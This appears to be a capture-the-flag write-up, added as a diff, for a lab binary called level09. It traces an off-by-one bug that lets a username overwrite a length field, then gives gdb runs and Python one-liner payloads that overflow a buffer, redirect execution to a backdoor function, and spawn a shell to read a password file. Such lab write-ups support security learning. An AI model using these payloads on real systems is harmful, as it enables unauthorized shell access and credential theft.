@@ -1,0 +1,48 @@
+The program does not really do anything, appart getting strings and copying them in a struct
+
+There is an off-by-one error on set_username: 
+while (n <= 40) instead of while (n < 40),
+in assembly:
+0x0000000000000a6a <+157>:   cmpl   $0x28,-0x4(%rbp)
+0x0000000000000a6e <+161>:   jg     0xa81 <set_username+180>
+
+jg should have been jge.
+
+This off-by-one error conveniently allows us to overwrite the msg->msg_len variable, who is just after the buffer overriden
+
+msg_len is used as the length to copy in set_msg, which could allow us to do a buffer overflow and override the return pointer
+to the function secret_backdoor.
+
+First step: input a username that is 40 chars + 0xFF, that will put "255" on msg_len and allow us to write 115 bytes after the end of the message buffer:
+
+(gdb) r < <(python -c "print 'A' * 40 + '\xFF'; print '\x00' * 255")
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
+
+The program segfaults, and the adress seems to come from our message buffer
+
+Let's find the offset
+After some tries, I find:
+r < <(python -c "print 'A' * 40 + '\xFF'; print '*' * 200 + 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) bt
+#0  0x0000555555554931 in handle_msg ()
+#1  0x4242424241414141 in ?? ()
+
+The offset is 200
+
+We now just need to put the adress of secret_backdoor and it should be good!
+
+(gdb) info func secret_backdoor
+All functions matching regular expression "secret_backdoor":
+
+Non-debugging symbols:
+0x000055555555488c  secret_backdoor
+
+Let's try it:
+(python -c "print 'A' * 40 + '\xFF'; print '*' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09
+
+And it works!
+We can enter the command '/bin/sh' and have a shell or directly 'cat /home/users/end/.pass'
